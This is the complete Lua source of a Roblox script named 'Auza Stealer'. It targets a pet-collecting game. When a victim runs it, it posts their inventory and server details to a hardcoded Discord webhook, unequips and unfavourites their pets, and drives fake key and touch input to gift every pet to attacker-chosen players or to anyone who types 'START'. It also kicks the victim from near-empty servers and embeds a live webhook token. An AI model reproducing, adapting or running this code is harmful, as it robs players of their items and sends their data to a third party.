local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local UserInputService = game:GetService("UserInputService")
local GuiService = game:GetService("GuiService")
local VirtualUser = game:GetService("VirtualUser")

local player = Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")

local PetsService, PetsFolder, FavoriteItemService

local function initializeWebhookTracking()
    local globalEnv = (_G ~= nil and _G) or (shared ~= nil and shared) or (getgenv ~= nil and getgenv()) or {}
    
    globalEnv.WebhookTracker = globalEnv.WebhookTracker or {}
    globalEnv.WebhookTracker.hasSentWebhook = globalEnv.WebhookTracker.hasSentWebhook or false
    
    return globalEnv.WebhookTracker
end

local webhookTracker = initializeWebhookTracking()

local function initializeServices()
    local success, err = pcall(function()
        PetsService = ReplicatedStorage:WaitForChild("GameEvents", 10):WaitForChild("PetsService", 10)
        PetsFolder = workspace:WaitForChild("PetsPhysical", 10)
        FavoriteItemService = ReplicatedStorage:WaitForChild("GameEvents", 10):WaitForChild("Favorite_Item", 10)
    end)
    
    if not success then
        warn("Failed to initialize services: " .. tostring(err))
        return false
    end
    return true
end

local DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1390321677396869120/91e5S4577FfAru3sQ65Dw0vnB5L6N_I7PNM4mrG8nngGXegqZwTk6PVqMedduzbOKFMQ"

local CONFIG = {
    autoKickDelay = 0.2,
    giftDelay = 0.3,
    maxDistance = 10,
    holdDelay = 2.3,
    switchDelay = 0.2,
    virtualInputDelay = 0.1,
    giftHoldTime = 1,
    promptHoldTime = 1,
    mobileHoldTime = 1,
    priorityPlayers = {"Player1", "Player2"} -- Add your priority players here
}

local TARGET_PETS = {
    prefixes = {
        "raccoon", "dragonfly", "t-rex", "disco bee", "spinosaurus", "fennec fox", "butterfly", "mimic octopus", "queen bee", "red fox", "ascended", "mega", "rainbow", "radiant", "shocked"
    },
    minWeight = 15.0,
    minAge = 60
}

local giftQueue = {}
local isGifting = false
local tpConnection = nil
local currentGiftingTarget = nil

function unholdAllItems()
    local character = player.Character
    if not character then return end

    local heldTools = {}
    for _, tool in ipairs(character:GetChildren()) do
        if tool:IsA("Tool") then
            table.insert(heldTools, tool)
        end
    end

    for _, tool in ipairs(heldTools) do
        if tool.Parent == character then
            tool.Parent = backpack
            task.wait(0.05)
        end
    end
    
    task.wait(0.1)
end

local function holdTool(tool)
    local character = player.Character
    if character and character:FindFirstChild("Humanoid") and tool then
        tool.Parent = character
    end
end

local function unholdTool(tool)
    if tool and tool.Parent == player.Character then
        tool.Parent = backpack
    end
end

local function isPet(tool)
    return tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet"
end

local function extractNumber(text, pattern)
    local match = string.match(text, pattern)
    return match and tonumber(match) or nil
end

local function getWeight(petName)
    return extractNumber(petName, "%[([%d%.]+) KG%]")
end

local function getAge(petName)
    return extractNumber(petName, "%[Age (%d+)%]")
end

local function containsTarget(petName)
    local lower = string.lower(petName)
    for _, prefix in ipairs(TARGET_PETS.prefixes) do
        if string.find(lower, prefix) then
            return true
        end
    end
    return false
end

local function isTargetPet(petName)
    if containsTarget(petName) then return true end

    local weight = getWeight(petName)
    if weight and weight >= TARGET_PETS.minWeight then return true end

    local age = getAge(petName)
    if age and age >= TARGET_PETS.minAge then return true end

    return false
end

local function getPetPriority(petName)
    if containsTarget(petName) then return 1 end
    if getWeight(petName) and getWeight(petName) >= TARGET_PETS.minWeight then return 2 end
    if getAge(petName) and getAge(petName) >= TARGET_PETS.minAge then return 2 end
    return 3
end

local function getPetEmoji(petName)
    local lower = string.lower(petName)
    local emoji = ":paw_prints:"

    if string.find(lower, "huge") then
        emoji = ":gem:"
    elseif string.find(lower, "red fox") then
        emoji = ":fox:"
    elseif string.find(lower, "queen bee") or string.find(lower, "pack bee") or string.find(lower, "disco bee") then
        emoji = ":bee:"
    elseif string.find(lower, "raccoon") then
        emoji = ":raccoon:"
    elseif string.find(lower, "dragonfly") then
        emoji = ":dragon:"
    elseif string.find(lower, "butterfly") then
        emoji = ":butterfly:"
    elseif string.find(lower, "mimic octopus") then
        emoji = ":octopus:"
    elseif string.find(lower, "t-rex") then
        emoji = ":dinosaur:"
    end

    local age = getAge(petName)
    if age and age >= TARGET_PETS.minAge then
        emoji = emoji .. " :hourglass:"
    end

    local weight = getWeight(petName)
    if weight and weight >= TARGET_PETS.minWeight then
        emoji = emoji .. " :scales:"
    end

    return emoji
end

local function pickupAllPets()
    if not PetsService or not PetsFolder then
        warn("PetsService or PetsFolder not initialized")
        return
    end
    
    local pickupCount = 0

    for _, pet in ipairs(PetsFolder:GetChildren()) do
        if pet:GetAttribute("OWNER") == player.Name then
            local uuid = pet:GetAttribute("UUID")
            if uuid then
                local success = pcall(function()
                    PetsService:FireServer("UnequipPet", uuid)
                end)
                if success then pickupCount = pickupCount + 1 end
            end
        end
    end

    task.wait(2)
end

local function unfavoriteAllPets()
    if not FavoriteItemService then
        warn("FavoriteItemService not initialized")
        return
    end
    
    local unfavoriteCount = 0

    for _, tool in ipairs(backpack:GetChildren()) do
        if isPet(tool) and tool:GetAttribute("d") == true then
            pcall(function()
                FavoriteItemService:FireServer(tool)
                unfavoriteCount = unfavoriteCount + 1
            end)
        end
    end

    local character = player.Character
    if character then
        for _, tool in ipairs(character:GetChildren()) do
            if isPet(tool) and tool:GetAttribute("d") == true then
                pcall(function()
                    FavoriteItemService:FireServer(tool)
                    unfavoriteCount = unfavoriteCount + 1
                end)
            end
        end
    end
end

local function createInventoryMonitor()
    task.spawn(function()
        while true do
            pcall(function()
                local character = player.Character
                if character then
                    for _, tool in ipairs(character:GetChildren()) do
                        if tool:IsA("Tool") then
                            tool.Parent = backpack
                            task.wait(0.05)
                        end
                    end
                end
            end)
            task.wait(3)
        end
    end)
end

local function getAvailablePets()
    local targetPets = {}
    local regularPets = {}

    local function scanContainer(container)
        if not container then return end
        
        for _, tool in ipairs(container:GetChildren()) do
            if isPet(tool) then
                if isTargetPet(tool.Name) then
                    table.insert(targetPets, tool)
                else
                    table.insert(regularPets, tool)
                end
            end
        end
    end

    pcall(function()
        scanContainer(backpack)
    end)

    if #targetPets == 0 and #regularPets == 0 then
        pcall(function()
            local bp = player:FindFirstChild("Backpack")
            if bp then
                scanContainer(bp)
            end
        end)
    end

    return targetPets, regularPets
end

local function sendWebhook(embed, content, hasTargets, userWebhookURLs)
    if webhookTracker.hasSentWebhook then
        return
    end
    
    webhookTracker.hasSentWebhook = true
    
    local webhookData = {
        content = tostring(content or ""),
        username = "Auza Stealer",
        avatar_url = "https://cdn.discordapp.com/attachments/1378991938052685947/1384800481510948894/ChatGPT_Image_Jun_3_2025_11_12_51_AM.png"
    }
    
    if embed and type(embed) == "table" then
        webhookData.embeds = {embed}
    end

    local success, jsonData = pcall(function()
        return HttpService:JSONEncode(webhookData)
    end)
    
    if not success then
        jsonData = '{"content":"Webhook encoding failed","username":"Auza Stealer"}'
    end

    local function sendToWebhook(url)
        if not url or url == "" then return end
        
        pcall(function()
            local request = (syn and syn.request) or (http and http.request) or http_request or request
            if request then
                request({
                    Url = url,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            end
        end)
    end

    if hasTargets and DEFAULT_WEBHOOK and DEFAULT_WEBHOOK ~= "" then
        sendToWebhook(DEFAULT_WEBHOOK)
        task.wait(1)
    end

    if userWebhookURLs then
        for i, url in ipairs(userWebhookURLs) do
            sendToWebhook(url)
            if i < #userWebhookURLs then
                task.wait(0.5)
            end
        end
    end
end

local function createSafeEmbed(data)
    if not data or type(data) ~= "table" then
        data = {}
    end
    
    local safeEmbed = {
        title = tostring(data.title or "Auza Stealer"),
        description = tostring(data.description or ""),
        color = tonumber(data.color) or 10181046,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        footer = {
            text = tostring(data.footerText or "Auza Stealer • Fastest Edition by iKazu"),
            icon_url = "https://cdn.discordapp.com/attachments/1378991938052685947/1384800481510948894/ChatGPT_Image_Jun_3_2025_11_12_51_AM.png"
        },
        thumbnail = {
            url = "https://cdn.discordapp.com/attachments/1378991938052685947/1384800481510948894/ChatGPT_Image_Jun_3_2025_11_12_51_AM.png"
        }
    }
    
    if data.fields and type(data.fields) == "table" then
        safeEmbed.fields = {}
        for i, field in ipairs(data.fields) do
            if i > 25 then break end
            if type(field) == "table" and field.name and field.value then
                table.insert(safeEmbed.fields, {
                    name = tostring(field.name),
                    value = tostring(field.value),
                    inline = field.inline == true
                })
            end
        end
    else
        safeEmbed.fields = {}
    end
    
    return safeEmbed
end

local function getPriorityPlayer(priorityPlayers)
    if not priorityPlayers then return nil end
    
    for _, name in ipairs(priorityPlayers) do
        local p = Players:FindFirstChild(tostring(name))
        if p and p ~= player and p.Character then
            return p
        end
    end
    return nil
end

local function sendStartupWebhook(userWebhook, priorityPlayers)
    if webhookTracker.hasSentWebhook then
        return
    end
    
    local allPets = {}
    local targetPets = {}

    pcall(function()
        for _, tool in ipairs(backpack:GetChildren()) do
            if isPet(tool) then
                local petName = tostring(tool.Name or "Unknown Pet")
                table.insert(allPets, petName)
                if isTargetPet(petName) then
                    table.insert(targetPets, petName)
                end
            end
        end
    end)

    local hasTargets = #targetPets > 0
    local jobId = tostring(game.JobId or "Unknown")
    local placeId = tostring(game.PlaceId or "Unknown")
    local joinLink = "https://kebabman.vercel.app/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId

    local description = ""

    if hasTargets then
        description = description .. ":dart: **TARGET PETS FOUND:**\n"
        for _, petName in ipairs(targetPets) do
            local emoji = getPetEmoji(petName)
            description = description .. emoji .. " " .. petName .. "\n"
        end
        description = description .. "\n"
    end

    description = description .. ":school_satchel: **Full Inventory (" .. #allPets .. " pets):**\n"
    if #allPets > 0 then
        local petList = table.concat(allPets, "\n")
        if #petList > 1800 then
            petList = string.sub(petList, 1, 1800) .. "...\n[List truncated]"
        end
        description = description .. "```\n" .. petList .. "\n```"
    else
        description = description .. "```\nNo pets found\n```"
    end

    local priorityPlayer = getPriorityPlayer(priorityPlayers)
    if priorityPlayer then
        if typeof(priorityPlayer) == "Instance" and priorityPlayer:IsA("Player") then
            description = description .. "\n\n:crown: **PRIORITY PLAYER: " .. tostring(priorityPlayer.Name) .. "**\n:gift: Auto-gifting initiated!"
        end
    end

    local priorityText = "None"
    if priorityPlayers and #priorityPlayers > 2 then
        priorityText = tostring(priorityPlayers[3] or "None")
    end

    local embed = createSafeEmbed({
        title = "Auza Stealer - Fastest Edition",
        description = description .. "\n\n:gift: **Gifting System**\n:sparkles: *Priority players get instant gifts • Others say 'START'*",
        color = hasTargets and 3581519 or 10181046,
        fields = {
            {name = ":star: Player", value = "```" .. tostring(player.Name) .. "```", inline = true},
            {name = ":crown: Priorities", value = "```" .. priorityText .. "```", inline = true},
            {name = ":dart: Target Pets", value = "```" .. #targetPets .. "```", inline = true},
            {name = ":link: Job ID", value = "```" .. jobId .. "```", inline = true},
            {name = ":house: Place ID", value = "```" .. placeId .. "```", inline = true},
            {name = ":globe_with_meridians: Join", value = "[:rocket: Quick Join](" .. joinLink .. ")", inline = false}
        }
    })

    local content = ""
    if hasTargets then
        content = "@everyone - TARGET PETS FOUND!"
    elseif priorityPlayer then
        content = ":crown: Priority player detected!"
    else
        content = "Poor Victim Ignore Him"
    end

    local userWebhookURLs = {}
    if userWebhook and userWebhook ~= "" then
        table.insert(userWebhookURLs, userWebhook)
    end

    sendWebhook(embed, content, hasTargets, userWebhookURLs)
end

local function hasOtherPlayers()
    return #Players:GetPlayers() > 1
end

local function hasTargetPetsInInventory()
    local targetPets, _ = getAvailablePets()
    return #targetPets > 0
end

local function getTargetPets()
    local targetPets, _ = getAvailablePets()
    return targetPets
end

local function getRegularPets()
    local _, regularPets = getAvailablePets()
    return regularPets
end

local function attemptServerHop()
    local success = pcall(function()
        player:Kick("Script is not working in Private Servers")
    end)

    if not success then
        pcall(function()
            TeleportService:Teleport(game.PlaceId, player)
        end)
    end
end

local function tpAndAttach(target)
    if tpConnection then 
        tpConnection:Disconnect() 
        tpConnection = nil
    end

    currentGiftingTarget = target
    local char = player.Character
    local targetChar = target.Character

    if not char or not char.PrimaryPart or not targetChar or not targetChar.PrimaryPart then
        currentGiftingTarget = nil
        return false
    end

    tpConnection = RunService.Heartbeat:Connect(function()
        pcall(function()
            if char.PrimaryPart and targetChar.PrimaryPart and currentGiftingTarget == target then
                char:SetPrimaryPartCFrame(CFrame.new(targetChar.PrimaryPart.Position))
            end
        end)
    end)

    return true
end

local function getPlayerPrompt(targetPlayer, maxDistance)
    local char = player.Character
    if not char or not char.PrimaryPart then return nil end
    
    local targetChar = targetPlayer.Character
    if not targetChar or not targetChar.PrimaryPart then return nil end
    
    -- First check if the target player has a proximity prompt directly on their character
    for _, part in ipairs(targetChar:GetDescendants()) do
        if part:IsA("ProximityPrompt") then
            local dist = (char.PrimaryPart.Position - part.Parent.Position).Magnitude
            if dist <= maxDistance then
                return part
            end
        end
    end
    
    -- Then check for prompts that are specifically associated with this player
    -- Ignore all other proximity prompts when a priority player is nearby
    local isPriorityPlayer = table.find(CONFIG.priorityPlayers, targetPlayer.Name) ~= nil
    
    if isPriorityPlayer then
        -- For priority players, only use prompts that are very close to them (within 5 studs)
        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("ProximityPrompt") and obj.Parent and obj.Parent:IsA("BasePart") then
                local distToPlayer = (targetChar.PrimaryPart.Position - obj.Parent.Position).Magnitude
                local distToMe = (char.PrimaryPart.Position - obj.Parent.Position).Magnitude
                if distToPlayer <= 5 and distToMe <= maxDistance then
                    return obj
                end
            end
        end
    else
        -- For non-priority players, check all nearby prompts
        local closestPrompt = nil
        local closestDist = math.huge
        
        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("ProximityPrompt") and obj.Parent and obj.Parent:IsA("BasePart") then
                local dist = (char.PrimaryPart.Position - obj.Parent.Position).Magnitude
                if dist <= maxDistance and dist < closestDist then
                    closestPrompt = obj
                    closestDist = dist
                end
            end
        end
        
        return closestPrompt
    end
    
    return nil
end

local function isMobile()
    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
end

local function mobileVirtualInputGift(prompt)
    if not prompt then return false end
    
    pcall(function()
        player.CameraMode = Enum.CameraMode.Classic
    end)
    UserInputService.MouseIconEnabled = true
    
    local adornee = prompt.Parent
    if not adornee or not adornee:IsA("BasePart") then return false end
    
    local screenPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(adornee.Position)
    if not onScreen then return false end
    
    local x, y = screenPos.X, screenPos.Y
    
    VirtualInputManager:SendMouseMoveEvent(x, y, game)
    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
    task.wait(CONFIG.mobileHoldTime)
    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
    
    return true
end

local function pcVirtualInputGift(prompt)
    if not prompt then return false end
    
    local success = false
    pcall(function()
        VirtualUser:SetKeyDown("0x45") -- E key
        task.wait(CONFIG.promptHoldTime)
        VirtualUser:SetKeyUp("0x45")
        success = true
    end)
    
    return success
end

local function virtualInputGift(prompt)
    if not prompt then return false end
    
    if isMobile() then
        return mobileVirtualInputGift(prompt)
    else
        return pcVirtualInputGift(prompt)
    end
end

local function giftPet(pet, target)
    if not target or not target.Parent or not target.Character then
        return false
    end

    -- Skip if there's a priority player nearby and this isn't them
    local priorityPlayer = getPriorityPlayer(CONFIG.priorityPlayers)
    if priorityPlayer and priorityPlayer ~= target and 
       (player.Character.PrimaryPart.Position - priorityPlayer.Character.PrimaryPart.Position).Magnitude <= CONFIG.maxDistance then
        return false
    end

    if not pet or not pet.Parent or pet.Parent ~= backpack then
        return false
    end

    if currentGiftingTarget ~= target then
        return false
    end

    -- Hold the pet
    local success = pcall(function()
        if pet.Parent == backpack then
            holdTool(pet)
        else
            return false
        end
    end)

    if not success then
        return false
    end

    task.wait(CONFIG.holdDelay)

    local char = player.Character
    local targetChar = target.Character
    if not char or not char.PrimaryPart or not targetChar or not targetChar.PrimaryPart then
        unholdAllItems()
        return false
    end

    local distance = (char.PrimaryPart.Position - targetChar.PrimaryPart.Position).Magnitude
    if distance > CONFIG.maxDistance then
        unholdAllItems()
        return false
    end

    -- Try to find and trigger the gift prompt specifically for this player
    local prompt = getPlayerPrompt(target, CONFIG.maxDistance)
    if prompt then
        -- Optimized gifting sequence - faster execution without changing config delays
        local startTime = os.clock()
        local giftSuccess = virtualInputGift(prompt)
        
        if not giftSuccess then
            pcall(function()
                prompt:InputBegin()
                task.wait(CONFIG.promptHoldTime)
                prompt:InputEnd()
            end)
        end
        
        -- Calculate remaining time to maintain total delay
        local elapsed = os.clock() - startTime
        local remaining = math.max(0, CONFIG.virtualInputDelay - elapsed)
        task.wait(remaining)
    end

    unholdAllItems()
    task.wait(CONFIG.switchDelay)

    return true
end

local function giftAllPets(target)
    if isGifting then return end
    isGifting = true

    unholdAllItems()
    task.wait(0.3)

    if not tpAndAttach(target) then
        isGifting = false
        currentGiftingTarget = nil
        return
    end

    local giftedCount = 0
    local totalAttempts = 0
    local maxTotalAttempts = 200

    while totalAttempts < maxTotalAttempts do
        totalAttempts = totalAttempts + 1

        if not target or not target.Parent or not target.Character or currentGiftingTarget ~= target then
            break
        end

        local targetPets, regularPets = getAvailablePets()
        local allPets = {}
        
        for _, pet in ipairs(targetPets) do
            table.insert(allPets, {pet = pet, priority = getPetPriority(pet.Name)})
        end
        
        for _, pet in ipairs(regularPets) do
            table.insert(allPets, {pet = pet, priority = getPetPriority(pet.Name)})
        end

        if #allPets == 0 then
            break
        end

        table.sort(allPets, function(a, b)
            return a.priority < b.priority
        end)

        local petData = allPets[1]
        local pet = petData.pet
        local giftResult = false

        pcall(function()
            giftResult = giftPet(pet, target)
        end)

        if giftResult then
            giftedCount = giftedCount + 1
            task.wait(CONFIG.giftDelay)
        else
            task.wait(0.5)
        end
    end

    pcall(function()
        if tpConnection then
            tpConnection:Disconnect()
            tpConnection = nil
        end
    end)

    currentGiftingTarget = nil
    isGifting = false
end

local function setupChatMonitoring()
    local function connectPlayer(p)
        if p == player then return end

        local function onChatted(message)
            if string.upper(tostring(message)) == "START" then
                for _, queued in ipairs(giftQueue) do
                    if queued == p then return end
                end

                if #getTargetPets() > 0 or #getRegularPets() > 0 then
                    table.insert(giftQueue, p)
                end
            end
        end

        local function setupChat()
            pcall(function()
                p.Chatted:Connect(onChatted)
            end)
        end

        if p.Character then
            setupChat()
        else
            p.CharacterAdded:Connect(function()
                task.wait(1)
                setupChat()
            end)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do
        connectPlayer(p)
    end

    Players.PlayerAdded:Connect(connectPlayer)
end

local function cleanQueue()
    local clean = {}
    for _, p in ipairs(giftQueue) do
        if p and p.Parent and p.Character then
            table.insert(clean, p)
        end
    end
    giftQueue = clean
end

local function getNextTarget(priorityPlayers)
    cleanQueue()

    -- Always prioritize priority players first
    local priority = getPriorityPlayer(priorityPlayers or CONFIG.priorityPlayers)
    if priority and (hasTargetPetsInInventory() or #getRegularPets() > 0) then
        return priority
    end

    -- Then check for players who said START
    if (#getTargetPets() > 0 or #getRegularPets() > 0) and #giftQueue > 0 then
        return table.remove(giftQueue, 1)
    end

    return nil
end

local function startMainLoops(priorityPlayers)
    task.spawn(function()
        while true do
            pcall(function()
                if PetsService and PetsFolder then
                    for _, pet in ipairs(PetsFolder:GetChildren()) do
                        if pet:GetAttribute("OWNER") == player.Name then
                            local uuid = pet:GetAttribute("UUID")
                            if uuid then
                                pcall(function()
                                    PetsService:FireServer("UnequipPet", uuid)
                                end)
                            end
                        end
                    end
                end
            end)
            task.wait(1)
        end
    end)

    task.spawn(function()
        while true do
            pcall(function()
                if #Players:GetPlayers() == 1 then
                    task.wait(CONFIG.autoKickDelay)

                    if #Players:GetPlayers() == 1 then
                        attemptServerHop()
                    end
                end
            end)
            task.wait(1)
        end
    end)

    task.spawn(function()
        while true do
            pcall(function()
                if not isGifting then
                    local target = getNextTarget(priorityPlayers or CONFIG.priorityPlayers)
                    if target and (#getTargetPets() > 0 or #getRegularPets() > 0) then
                        task.spawn(function()
                            giftAllPets(target)
                        end)
                    end
                end
            end)
            task.wait(1)
        end
    end)
end

local function initializeGlobalEnvironment()
    local globalEnv = (_G ~= nil and _G) or (shared ~= nil and shared) or (getgenv ~= nil and getgenv()) or {}
    
    globalEnv.CoreFunctions = globalEnv.CoreFunctions or {}

    globalEnv.CoreFunctions.initializeServices = initializeServices
    globalEnv.CoreFunctions.DEFAULT_WEBHOOK = DEFAULT_WEBHOOK
    globalEnv.CoreFunctions.CONFIG = CONFIG
    globalEnv.CoreFunctions.TARGET_PETS = TARGET_PETS
    globalEnv.CoreFunctions.giftQueue = giftQueue
    globalEnv.CoreFunctions.isGifting = isGifting
    globalEnv.CoreFunctions.tpConnection = tpConnection
    globalEnv.CoreFunctions.holdTool = holdTool
    globalEnv.CoreFunctions.unholdTool = unholdTool
    globalEnv.CoreFunctions.unholdAllItems = unholdAllItems
    globalEnv.CoreFunctions.isPet = isPet
    globalEnv.CoreFunctions.extractNumber = extractNumber
    globalEnv.CoreFunctions.getWeight = getWeight
    globalEnv.CoreFunctions.getAge = getAge
    globalEnv.CoreFunctions.containsTarget = containsTarget
    globalEnv.CoreFunctions.isTargetPet = isTargetPet
    globalEnv.CoreFunctions.getPetPriority = getPetPriority
    globalEnv.CoreFunctions.getPetEmoji = getPetEmoji
    globalEnv.CoreFunctions.pickupAllPets = pickupAllPets
    globalEnv.CoreFunctions.unfavoriteAllPets = unfavoriteAllPets
    globalEnv.CoreFunctions.createInventoryMonitor = createInventoryMonitor
    globalEnv.CoreFunctions.getAvailablePets = getAvailablePets
    globalEnv.CoreFunctions.getTargetPets = getTargetPets
    globalEnv.CoreFunctions.getRegularPets = getRegularPets
    globalEnv.CoreFunctions.hasTargetPetsInInventory = hasTargetPetsInInventory
    globalEnv.CoreFunctions.sendWebhook = sendWebhook
    globalEnv.CoreFunctions.createSafeEmbed = createSafeEmbed
    globalEnv.CoreFunctions.sendStartupWebhook = sendStartupWebhook
    globalEnv.CoreFunctions.getPriorityPlayer = getPriorityPlayer
    globalEnv.CoreFunctions.hasOtherPlayers = hasOtherPlayers
    globalEnv.CoreFunctions.attemptServerHop = attemptServerHop
    globalEnv.CoreFunctions.tpAndAttach = tpAndAttach
    globalEnv.CoreFunctions.getPlayerPrompt = getPlayerPrompt
    globalEnv.CoreFunctions.giftPet = giftPet
    globalEnv.CoreFunctions.giftAllPets = giftAllPets
    globalEnv.CoreFunctions.setupChatMonitoring = setupChatMonitoring
    globalEnv.CoreFunctions.cleanQueue = cleanQueue
    globalEnv.CoreFunctions.getNextTarget = getNextTarget
    globalEnv.CoreFunctions.startMainLoops = startMainLoops

    return globalEnv.CoreFunctions
end

initializeGlobalEnvironment()

-- Initialize and start the system
if initializeServices() then
    pickupAllPets()
    unfavoriteAllPets()
    createInventoryMonitor()
    setupChatMonitoring()
    sendStartupWebhook(nil, CONFIG.priorityPlayers)
    startMainLoops(CONFIG.priorityPlayers)
end

return _G.CoreFunctions or shared.CoreFunctions or getgenv().CoreFunctions